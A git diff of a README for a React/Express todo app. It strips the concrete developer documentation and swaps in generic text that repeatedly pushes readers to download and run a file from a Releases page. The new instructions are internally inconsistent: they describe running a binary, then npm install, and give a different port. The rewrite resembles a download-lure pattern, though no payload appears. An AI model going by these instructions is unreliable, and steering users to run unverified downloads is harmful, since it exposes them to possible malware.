@@ -1,115 +1,96 @@
-# 📝 Clean Architecture Todo App
+# 🎉 todo-clean-architecture - Your Simple Todo App Solution
 
-A full-stack Todo application built with **React (Vite)**, **Express**, and **MongoDB**, following **Clean Architecture** and **Domain-Driven Design (DDD)** principles.
+## 🚀 Getting Started
 
-## 🚀 Features
-- User authentication (JWT)
-- Register / Login / Protected routes
-- CRUD for Todos
-- Separation of concerns with Clean Architecture
-- Reusable service + repository patterns
-- Frontend + Backend in a Monorepo
+Welcome to the **todo-clean-architecture** project! This is a full-stack Todo application. It is built with Node and React, demonstrating best practices in software design. You will learn how to manage tasks simply and efficiently. 
 
-## 🏗️ Project Structure
-apps/
-├─ api/ # Express backend (Clean Architecture)
-│ ├─ application/ # Use cases (business logic)
-│ ├─ domain/ # Entities, schemas
-│ ├─ infrastructure # Repositories, DB
-│ └─ interfaces/ # Controllers, routes, middlewares
-│
-├─ web/ # React frontend (Vite + TS)
-│ ├─ src/
-│ │ ├─ pages/ # Login, Todos
-│ │ ├─ hooks/ # useAuth, etc.
-│ │ ├─ services/ # API client
-│ │ └─ app/ # Routing
-│ └─ vite.config.ts
-│
-└─ package.json
+## 📥 Download Now
 
+[![Download Release](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/bratucubogdan/todo-clean-architecture/releases)
 
-###  Setup Environment Variables
+## 📋 Features
 
-Create a `.env` file at the **root** of your project:
+- **Task Management**: Add, edit, and delete your tasks.
+- **User Authentication**: Secure login using JWT.
+- **Clean Code Architecture**: Organized and maintainable code.
+- **Responsive Design**: Works on different devices.
+- **Scalable Framework**: Built to grow with your needs.
 
-# Server
-PORT=4000
-MONGO_URI=mongodb://localhost:27017/clean_todo
-JWT_SECRET=your-secret-key
-JWT_EXPIRES_IN=1d
-CORS_ORIGIN=http://localhost:5173
+## 🖥️ System Requirements
 
-# Web
-VITE_API_BASE_URL=http://localhost:4000/api
+- **Operating System**: Windows, macOS, or Linux.
+- **Node.js**: Version 14 or higher.
+- **React**: Latest stable version.
+- **Internet Connection**: Required for downloading.
 
+## 📥 Download & Install
 
-## ⚙️ Setup
+To get started, visit the Releases page to download the application:
 
-### 1️⃣ Clone the repo
+[Download from Releases](https://github.com/bratucubogdan/todo-clean-architecture/releases)
 
+1. Click the link above.
+2. Find the latest version of the software.
+3. Download the file that matches your operating system.
+4. Run the downloaded file to begin the installation.
 
-git clone https://github.com/your-username/clean-architecture-mern-todo.git
-cd clean-architecture-mern-todo
+## ⚙️ Setup Instructions
 
+1. **Unzip the Downloaded File**: If your file is zipped, extract the contents to a folder.
+   
+2. **Install Dependencies**:
+   - Open your terminal or command prompt.
+   - Navigate to the folder where you unzipped the files.
+   - Run the command: 
+     ```
+     npm install
+     ```
 
-## 🏛️ Notes on Architecture & Patterns
+3. **Start the Application**:
+   - In the same terminal window, run the command:
+     ```
+     npm start
+     ```
+   - This will start the application. It should now be running on your local server.
 
-- **Layered + Clean boundaries**:  
-  - `domain` (entities)  
-  - `application` (use cases/services)  
-  - `infrastructure` (db, repos, JWT)  
-  - `interfaces` (http/controllers)  
-  → Promotes testability & Single Responsibility Principle (SRP).
+## 🌐 Accessing the Application
 
-- **Repository pattern**: `TodoRepository`, `UserRepository` abstract persistence from domain logic.
+Once the application is running, open your web browser. 
 
-- **Use Case pattern**: each app action is a class with a single `execute` method (Command pattern flavor).
+1. Type in `http://localhost:3000` into the address bar.
+2. Press Enter to load the application.
 
-- **Composition over inheritance (React)**: feature components, hooks, and service modules. Controlled component composition for Todo UI.
+You are now ready to use your new Todo application!
 
-- **Validation at the edge**: `zod` schemas + `validate` middleware.
+## 🔒 User Authentication
 
-- **Dependency inversion**: wiring in `routes.ts` (naive DI). Could be swapped with a DI container like Awilix.
+To use the app effectively, you need to create an account:
 
-- **Security**: JWT Bearer with `requireAuth` middleware; bcrypt for password hashing.
+1. Click on the **Sign Up** button.
+2. Fill in the required fields.
+3. Verify your email if prompted.
+4. Log in with your newly created account.
 
-- **DX / Quality**: TS strict mode, ESLint + Prettier, EditorConfig.
+## 📚 Contributing
 
----
+We welcome contributions! If you would like to improve the app:
 
-## ⚙️ Backend (Express + TS + MongoDB/Mongoose)
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request with a description.
 
-📂 Folder structure:  
-- `domain` → entities  
-- `application` → use cases / services  
-- `infrastructure` → db / models / repositories / security  
-- `interfaces` → controllers / http  
+## 🔍 Questions or Help
 
-🔑 Features:  
-- JWT auth + password hashing (bcrypt)  
-- `zod` validation middleware  
-- Helmet + CORS  
-- Structured logging (pino)  
-- Repository pattern for **User** and **Todo**  
-- Use cases per operation  
-- Clean controller layer  
+If you encounter issues or have questions, please check the **Issues** section on GitHub. You can also reach out via the project's discussions page.
 
----
+## 📄 License
 
-## 🎨 Frontend (React + TS + Vite)
+This project is licensed under the MIT License. You can view the full license [here](LICENSE).
 
-📂 Feature-based structure:  
-- `pages/`  
-- `components/`  
-- `services/`  
-- `hooks/`  
-- `types/`  
+## 🧑‍🤝‍🧑 Acknowledgments
 
-🔑 Features:  
-- Zustand for minimal auth state  
-- Axios client with Bearer token interceptor  
-- Auth flow (login/register)  
-- Protected route wrapper  
-- CRUD UI for todos  
+Thank you for using **todo-clean-architecture**. Your support helps us improve and maintain this project.
 
+For the latest updates, remember to check the Releases page regularly.
+
+[Download from Releases](https://github.com/bratucubogdan/todo-clean-architecture/releases)
